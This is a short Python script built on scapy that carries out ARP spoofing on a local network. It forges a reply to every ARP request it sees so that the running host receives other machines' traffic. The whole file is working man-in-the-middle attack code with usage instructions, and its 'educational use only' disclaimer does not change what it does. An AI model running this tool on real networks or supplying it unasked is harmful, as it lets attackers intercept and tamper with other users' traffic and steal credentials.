#!/usr/bin/python

# This tool is for educational use only!

# Directs all ethernet traffic of a given interface in the lan
# over the host that runs this script. This is done via arp-spoofing

# Requirements: scapy + root privilegues

import sys
from scapy.all import *

def printusage():
  """ Prints usage information """
  print "Usage:   {0} <iface>".format(sys.argv[0])
  print "  ---> This tool is for educational use only! <---"

if len(sys.argv) < 2:
  printusage()
  sys.exit(1)

def arp_poison_callback(packet):
  """ Reply to all arp requests
  :param packet: the rescieved packet """
  # Got ARP request?
  if packet[ARP].op == 1:
    # modify the ethernet package that you are now the destination
    answer = Ether(dst=packet[ARP].hwsrc) / ARP()
    answer[ARP].op = "is-at"
    answer[ARP].hwdst = packet[ARP].hwsrc
    answer[ARP].psrc = packet[ARP].pdst
    answer[ARP].pdst = packet[ARP].psrc

    print "Fooling {0} that {1} is me".format(packet[ARP].psrc, packet[ARP].pdst)
    # send the poisoned package
    sendp(answer, iface=sys.argv[1])

# let scapy sniff the network traffic (store=1 to save the traffic)
sniff(prn=arp_poison_callback, filter="arp", iface=sys.argv[1], store=0)
